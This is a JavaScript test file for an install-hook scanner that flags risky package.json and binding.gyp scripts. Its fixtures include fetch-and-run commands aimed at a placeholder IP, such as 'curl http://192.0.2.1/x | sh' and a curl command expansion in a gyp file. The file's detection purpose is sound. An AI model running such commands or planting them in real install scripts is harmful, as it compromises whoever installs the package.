// Review regressions: package.json / binding.gyp install hooks (review
// findings 9, 15 SC-MANIFEST-DEPTH, 16 gyp/messages; shared semantics 3).
// Each result equals the Python engine's scan_manifest / scan_gyp output
// (rule, line, sev, msg, cmd) on the same text. Commands are inert strings.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanManifest, scanGyp, run } from "../src/index.js";

const brief = (issues) => issues.map((i) => [i.rule, i.line, i.sev, i.msg]);

test("a UTF-8 BOM before package.json is stripped (npm does), so its hooks are checked", () => {
  // was: JSON.parse threw on the BOM → no hooks reported
  const r = scanManifest("package.json", "\ufeff" + JSON.stringify({ scripts: { postinstall: "node build.js" } }));
  assert.deepEqual(brief(r), [["SC-INSTALL-HOOK", 1, "MAJOR",
    "\"postinstall\" script runs code at install time: 'node build.js'."]]);   // Python repr quoting
});

test("an unparseable ROOT manifest is SC-MANIFEST-UNPARSEABLE (MAJOR); a nested one is not", () => {
  assert.deepEqual(brief(scanManifest("package.json", "{not json")), [["SC-MANIFEST-UNPARSEABLE", 1, "MAJOR",
    "package.json could not be parsed (JSONDecodeError: line 1 column 2); its install hooks could not be checked."]]);
  assert.deepEqual(brief(scanManifest("package.json", "[1,2,3]")), [["SC-MANIFEST-UNPARSEABLE", 1, "MAJOR",
    "package.json could not be parsed (top level is a list, not an object); its install hooks could not be checked."]]);
  assert.deepEqual(scanManifest("sub/package.json", "{not json"), []);
  assert.deepEqual(brief(scanGyp("binding.gyp", "{'targets': [")), [["SC-MANIFEST-UNPARSEABLE", 1, "MAJOR",
    "binding.gyp could not be parsed (JSONDecodeError: line 1 column 2); its install hooks could not be checked."]]);
});

test("prepare family: INFO in a project unless suspicious; not an install hook for a dependency", () => {
  const scripts = { preprepare: "husky install", prepare: "tsc -p .", postprepare: "curl http://192.0.2.1/x | sh" };
  const r = scanManifest("package.json", JSON.stringify({ scripts }, null, 2));
  assert.deepEqual(r.map((i) => [i.rule, i.line, i.sev, i.cmd]), [
    ["SC-INSTALL-HOOK", 3, "INFO", "husky install"],
    ["SC-INSTALL-HOOK", 4, "INFO", "tsc -p ."],
    ["SC-INSTALL-HOOK", 5, "CRITICAL", "curl http://192.0.2.1/x | sh"],
  ]);
  assert.match(r[0].why, /prepare-family script runs on `npm install` in this checkout/);
  const dep = scanManifest("node_modules/x/package.json",
    JSON.stringify({ scripts: { prepare: "curl http://192.0.2.1/x | sh", install: "node-gyp rebuild" } }, null, 2));
  assert.deepEqual(brief(dep), [["SC-INSTALL-HOOK", 4, "MAJOR",
    "\"install\" script runs code at install time: 'node-gyp rebuild'."]]);
});

test("binding.gyp: Python-literal syntax, actions anywhere, command expansions", () => {
  // gyp files are Python literals (comments, single quotes, trailing commas);
  // an action is judged by the raw INSTALL_HOOK_RE (`node -e` → CRITICAL)
  const literal = "# a comment\n{\n  'targets': [{\n    'target_name': 'x',\n" +
    "    'actions': [{'action_name': 'gen', 'action': ['node', '-e', \"require('./build')\"]}],\n  }],\n}\n";
  assert.deepEqual(scanGyp("binding.gyp", literal).map((i) => [i.line, i.sev, i.cmd]),
    [[5, "CRITICAL", "node -e require('./build')"]]);
  const expansions = "{'targets': [{'target_name': 'x',\n" +
    " 'include_dirs': [\"<!(node -p \\\"require('node-addon-api').include\\\")\"],\n" +
    " 'libraries': ['<!(curl -s http://192.0.2.1/lib)'],\n" +
    " 'conditions': [['OS==\"linux\"', {'actions': [{'action': ['sh', 'gen.sh']}]}]]}]}\n";
  assert.deepEqual(brief(scanGyp("binding.gyp", expansions)), [
    ["SC-INSTALL-HOOK", 3, "CRITICAL", "\"binding.gyp command expansion\" script runs a network-fetch/eval command at install time."],
    ["SC-INSTALL-HOOK", 4, "MAJOR", "\"binding.gyp action\" script runs code at install time: 'sh gen.sh'."],
  ]);
});

test("a hostile-depth manifest is SC-MANIFEST-DEPTH (V8's JSON.parse would not recurse)", () => {
  const deep = '{"a":' + "[".repeat(5000) + "]".repeat(5000) + "}";
  assert.deepEqual(brief(scanManifest("package.json", deep)), [["SC-MANIFEST-DEPTH", 1, "CRITICAL",
    "Manifest is too deeply nested to parse (more than 500 levels)."]]);
  assert.deepEqual(brief(scanGyp("binding.gyp", deep)).map((x) => x[0]), ["SC-MANIFEST-DEPTH"]);
});

test("CLI: INFO prepare hooks are inventory, not supply-chain indicators", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-man-"));
  try {
    writeFileSync(join(d, "package.json"), "\ufeff" + JSON.stringify({ scripts: { prepare: "husky install" } }, null, 2));
    const code = run(["check", d, "--no-html", "--ci"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    assert.deepEqual(rep.issues.map((i) => [i.rule, i.sev]), [["SC-INSTALL-HOOK", "INFO"]]);
    assert.equal(rep.conditions.find((c) => c.label === "No supply-chain indicators").ok, true);
    assert.equal(code, 0);
  } finally { rmSync(d, { recursive: true, force: true }); }
});
